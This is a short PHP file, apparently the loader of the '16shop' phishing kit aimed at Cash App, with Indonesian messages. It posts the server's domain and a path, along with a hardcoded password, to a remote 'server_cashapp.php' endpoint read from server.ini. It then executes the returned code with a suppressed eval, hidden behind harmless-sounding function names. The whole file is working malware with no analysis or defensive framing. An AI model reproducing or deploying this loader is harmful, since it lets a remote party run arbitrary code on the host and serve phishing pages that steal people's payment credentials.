<?php
function checkcurl(){
    return function_exists('curl_version');
}
$check = checkcurl();
if($check == "0") {
    echo "Curl belum terinstall, mohon install php curl terlebih dahulu.";
    exit();
}
function load($domain,$path) {
        $get = curl_init();
        $server = parse_ini_file("server.ini", true);
        $url = 'http://'.$server['server_1'].'/api/server_cashapp.php';
        $random = rand(0,1);
        curl_setopt($get, CURLOPT_URL,$url);
        curl_setopt($get, CURLOPT_POST, 1);
        curl_setopt($get, CURLOPT_ENCODING, "gzip,deflate");
        curl_setopt($get, CURLOPT_POSTFIELDS, "password=16shop&domain=$domain&path=$path");
        curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($get, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        $server_output = curl_exec($get);
        curl_close($get);
        $set = json_decode($server_output, true);
        return $set['code'];
}

function welcome($val) {
    @eval("?>".$val);
}

function valid_file($path){
    $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
    welcome(load($domain,$path));
}
?>